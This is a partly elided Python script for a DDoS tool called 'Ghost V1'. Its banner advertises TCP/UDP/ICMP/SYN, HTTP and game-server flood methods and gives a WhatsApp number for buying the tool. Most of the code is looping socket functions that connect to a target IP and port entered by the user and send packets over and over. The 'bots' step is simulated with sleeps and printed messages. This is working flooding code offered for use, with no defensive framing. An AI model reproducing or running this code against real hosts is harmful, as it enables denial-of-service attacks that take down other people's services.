...
│ * UPDATE V1                             
│ * ADD BOTS                             
│ * AUTO MAINTANCE IF UPDATE                           
│ * ADD LOGS ATTACK AT DISCORD                         
│ * ADD USER IP                 
│ * LAYER 4 METHOD                           
│ * LAYER 7 METHOD                          
│ * VIP METHOD                        
│ * GAME METHOD                         
│                              
│ * MORE METHOD WILL BE AVAILABLE SOON                          
│ * @Copyright Ghost V1                            
└──────────────────────────────┘
""")
time.sleep(5)
...
bots = 0
os.system(f"title USER IP : [{local_ip}] TOTAL BOTS [{bots}] ")
print(" ADD 1 BOTS FOR YOU PLEASE WAIT...")
time.sleep(5)

print(" BOTS HAS BEEN CONNECT ")
banner = ("""
 ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗ LAYER 4 METHOD : TCP / UDP / ICMP / SYN
██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝ LAYER 7 METHOD : HTTP
██║  ███╗███████║██║   ██║███████╗   ██║    GAME METHOD : GTPS / SAMP 
██║   ██║██╔══██║██║   ██║╚════██║   ██║    VIP METHOD : BOOM / OVH
╚██████╔╝██║  ██║╚██████╔╝███████║   ██║
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝    BUY TOOL WA +6285891371231 VINZPLER01
 [I will not be responsible for ddos attacks]
""")      



# function for otp generatio
# Main Functions
...
class RequestThread(threading.Thread):
     def run6(self):
         while True:
                ...
                req = packets[random.randrange(0,3)]
...
def run3():
    ...
    while True:
        try:
            ...
            for x in range(500):
                s.send(data)
            print(f"ATTACK {ip} ON PORT {port} ")
        except socket.error:
            pass
            print(f"ATTACK {ip} ON PORT {port} ")
...
def run7():
    ...
    while True:
        try:
            s = socket.socket (socket.AF_INET, socket.TCP_KEEPCNT)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
...
def run4():
  ...
  while True:
    try:
      ...
      atk.connect((ip, port))
      for y in range(30): # Start attack
...
def run8():
  ...
  while True:
    try:
      ...
      atk.connect((ip, port))
      for y in range(10): # Start attack
          atk.send(str.encode(request))
    except socket.error:
      time.sleep(.1)
    except:
...
ip = str(input("[+] Enter IP Target : "))
ip = socket.gethostbyname(ip)
port = int(input("[+] Enter IP Port (80)   : "))
times = int(input("[+] Enter Packet (90048) : "))
...
if method == "SAMP":
   ...
   print(f" REQUEST BOTS TO ATTACK {ip} ")
